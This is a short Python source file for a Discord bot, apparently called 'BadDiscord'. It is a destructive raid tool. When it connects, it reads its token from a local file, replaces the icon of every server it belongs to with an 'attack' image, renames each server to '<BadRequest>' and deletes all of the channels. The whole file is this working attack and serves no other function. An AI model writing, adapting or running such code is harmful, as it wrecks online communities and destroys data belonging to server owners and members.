# {
from ast import Delete
from email.quoprimime import body_length
import time
from unicodedata import name
import discord
from discord.ext import commands
import os
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True) 
# }

# Read Token
#with open("System\TempToken.dll", 'r') as file:
#    bot_token = file.read('System\TempToken.dll')
#    bot_token = None(bot_token)

# ----------------------------------------------
with open("System/TempToken.pd", 'r') as file:
    bot_token = file.read()
# ----------------------------------------------

print("")
intents = discord.Intents(messages=True, guilds=True, reactions=True, members=True, presences=True)
Bot = commands.Bot(command_prefix='BadDiscord --', intents=intents)

@Bot.event
async def on_ready():
    # ----------------------------------------------
    with open("System/Attack/ico.jpg", 'rb') as file:
        attack_ico = file.read()
    # ----------------------------------------------
        
    try:
        for guild in Bot.guilds: # Reset-icon
            await guild.edit(icon=attack_ico)
        #
        print(f"{Fore.GREEN} İcon [ok]")
    except:
        print(f"{Fore.RED} İcon [err]")

    try:
        for guild in Bot.guilds: # Reset-name
            await guild.edit(name="<BadRequest>")
        #
        print(f"{Fore.GREEN} Name [ok]")
    except:
        print(f"{Fore.RED} Name [err]")

    try:
        for guild in Bot.guilds: # Reset-channels
            for channel in guild.channels:
                await channel.delete()
        #
        print(f"{Fore.GREEN} Channels [ok]")
    except:
        print(f"{Fore.RED} Channels [err]")


Bot.run(bot_token) 